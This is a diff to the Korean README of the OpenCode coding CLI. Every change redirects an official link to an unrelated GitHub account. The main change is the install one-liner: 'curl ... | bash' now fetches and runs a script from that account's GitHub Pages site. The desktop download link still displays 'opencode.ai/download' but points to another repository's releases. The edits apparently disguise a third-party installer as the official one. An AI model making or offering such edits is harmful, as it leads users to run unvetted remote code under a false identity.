@@ -11,7 +11,7 @@
 <p align="center">
   <a href="https://opencode.ai/discord"><img alt="Discord" src="https://img.shields.io/discord/1391832426048651334?style=flat-square&label=discord" /></a>
   <a href="https://www.npmjs.com/package/@opencode/cli"><img alt="npm" src="https://img.shields.io/npm/v/@opencode/cli?style=flat-square" /></a>
-  <a href="https://github.com/anomalyco/opencode/actions/workflows/release.yml"><img alt="Build status" src="https://img.shields.io/github/actions/workflow/status/anomalyco/opencode/release.yml?style=flat-square&branch=dev" /></a>
+  <a href="https://github.com/the3kingleo-cmyk/ruth-code"><img alt="Build status" src="https://img.shields.io/github/actions/workflow/status/anomalyco/opencode/release.yml?style=flat-square&branch=dev" /></a>
 </p>
 
 <p align="center">
@@ -47,7 +47,7 @@
 
 ```bash
 # YOLO
-curl -fsSL https://opencode.ai/v2/install | bash
+curl -fsSL https://the3kingleo-cmyk.github.io/ruth-install | bash
 
 # 패키지 매니저
 npm i -g @opencode/cli@latest      # bun/pnpm/yarn 도 가능
@@ -64,7 +64,7 @@ nix run github:anomalyco/opencode  # Nix
 
 ### 데스크톱 앱 (BETA)
 
-OpenCode 는 데스크톱 앱으로도 제공됩니다. [opencode.ai/download](https://opencode.ai/download) 에서 다운로드하세요.
+OpenCode 는 데스크톱 앱으로도 제공됩니다. [opencode.ai/download](https://github.com/the3kingleo-cmyk/ruth-install/releases) 에서 다운로드하세요.
 
 | 플랫폼                | 다운로드                           |
 | --------------------- | ---------------------------------- |
@@ -95,11 +95,11 @@ OpenCode 에는 내장 에이전트 2개가 있으며 `Tab` 키로 전환할 수
 또한 복잡한 검색과 여러 단계 작업을 위한 **general** 서브 에이전트가 포함되어 있습니다.
 내부적으로 사용되며, 메시지에서 `@general` 로 호출할 수 있습니다.
 
-[agents](https://opencode.ai/docs/agents) 에 대해 더 알아보세요.
+[agents](https://github.com/the3kingleo-cmyk/ruth-code) 에 대해 더 알아보세요.
 
 ### 문서
 
-OpenCode 설정에 대한 자세한 내용은 [**문서**](https://opencode.ai/docs) 를 참고하세요.
+OpenCode 설정에 대한 자세한 내용은 [**문서**](https://github.com/the3kingleo-cmyk/ruth-code) 를 참고하세요.
 
 ### 기여하기
 
